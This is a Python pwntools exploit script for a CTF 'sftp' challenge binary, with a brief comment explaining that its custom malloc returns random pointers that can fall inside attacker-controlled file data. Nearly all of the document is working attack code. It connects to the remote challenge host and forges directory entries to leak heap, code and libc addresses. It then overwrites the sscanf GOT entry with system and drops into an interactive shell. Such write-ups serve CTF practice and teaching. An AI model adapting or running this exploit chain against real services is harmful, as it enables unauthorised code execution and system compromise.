"""
There are actually a lot of problems in this binary, but most of them can only used to cause dos. For examle `mkdir /` or (`mkdir A*20` then `cd A*20`) for a lot of times.
It took me a lot of time to read the source and forgot about the heap implementation(thought it used glibc implementation).
READ how `malloc`, `free`, `realloc` are implemented in your disassembler! Jesus!
The `malloc` simply return an random pointer. What if the pointer is controlled by a file? Then the entry(say dir entry) is under our control.
Keep this in mind, then we are able to do something really bad.
"""
from pwn import *

NUM = 2000
elf = ELF('./sftp')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')# the libc used in server happens to match mine
class Process(object):
    def __init__(self):
        #self.r = process('./sftp')
        self.r = remote('sftp.ctfcompetition.com', 1337)
        self.r.sendlineafter('(yes/no)? ', 'yes')
        self.r.sendlineafter('password: ', 'm\x05\xa2\x01\xff\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01')# solved by `angr`

        # trying to be lazy
        self.recv = self.r.recv
        self.send = self.r.send
        self.sendline = self.r.sendline
        self.recvline = self.r.recvline
        self.recvuntil = self.r.recvuntil
        self.close = self.r.close
        self.clean = self.r.clean
        self.interactive = self.r.interactive

    def mkdir(self, name):
        print name
        self.r.sendlineafter('sftp> ', 'mkdir '+name)
    def cd(self, name):
        self.r.sendlineafter('sftp> ', 'cd '+name)
    def pwd(self):
        self.r.sendlineafter('sftp> ', 'pwd')
    def put(self, fname, content):
        self.r.sendlineafter('sftp> ', 'put '+fname)
        self.r.sendline(str(len(content)))
        time.sleep(0.5)
        self.r.send(content)
    def get(self, fname):
        self.r.sendlineafter('sftp> ', 'get '+fname)

def attack(r, e):
    print 'attcking'

    # put a large file on the fs
    r.put('test', 'A'*(0xffff-4)+'CCCC')

    # make a lot of dir hoping one of the pointer will be within the range the content of `test` file
    r.sendline('\n'.join(['mkdir {}'.format(i) for i in range(NUM)]))

    # clean up the mess
    r.clean()
    r.sendline('ls')

    # get the content of `test`
    r.get('test')
    r.recvuntil('65535\n')
    content = r.recvuntil('CCCC')

    # if we are lucky, a dir entry lies within the content, we can leak a the addr of `/home/c01db33f` chunk
    idx = content.index('\x00')
    chunk = content[idx-4:idx+0x30-4]
    home = u64(chunk[0:4]+'\x00'*4)
    entry_type = u32(chunk[8:0xc])
    name = chunk[0xc:0x20].split('\x00', 1)[0]
    log.info('Gained control over chunk %s !!' % name)
    log.info('/home/c01db33f chunk addr: %#x' % home)

    ### leak code base ###
    # by overwriting the victim dir, we can mark it as a file and set the data pointer to be the addr of `/home/c01db33f` chunk
    # in the way, we can leak the `root` or `/home` chunk which is within the code section(it is initialized in `init` function)
    new_chunk = p64(home)+p32(2)+'victim'+'\x00'*14+p64(0x40)+p64(home)
    payload = content[:idx-4]+new_chunk+content[idx+len(new_chunk)-4:]
    r.put('test', payload)
    r.get('victim')
    r.recvuntil('\n')
    chunk = r.recv(0x40)
    code_base = u64(chunk[0:8])-0x208be0
    log.info('code base: %#x' % code_base)

    ### leak libc base ###
    # in the same way, we can leak got table so that we know the libc base
    new_chunk = p64(home)+p32(2)+'victim'+'\x00'*14+p64(0x40)+p64(code_base+e.got['puts'])
    payload = content[:idx-4]+new_chunk+content[idx+len(new_chunk)-4:]
    r.put('test', payload)
    r.get('victim')
    r.recvuntil('\n')
    chunk = r.recv(0x40)
    libc_base = u64(chunk[0:8]) - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    log.info('libc base: %#x' % libc_base)
    log.info('system addr: %#x' % system)

    ### exploit ###
    # overwrite sscanf with system
    new_chunk = p64(home)+p32(2)+'victim'+'\x00'*14+p64(8)+p64(code_base+e.got['__isoc99_sscanf'])
    payload = content[:idx-4]+new_chunk+content[idx+len(new_chunk)-4:]
    r.put('test', payload)
    r.put('victim', p64(system))

    # shell
    r.sendline('put')
    r.sendline('sh')

    # clean things up
    time.sleep(1)
    r.clean()

    # id
    r.sendline('id')

    r.interactive()

# try to be lucky
# and wait for a shell to popup
while True:
    try:
        r = Process()
        attack(r, elf)
        break
    except Exception as e:
        print e
        r.close()

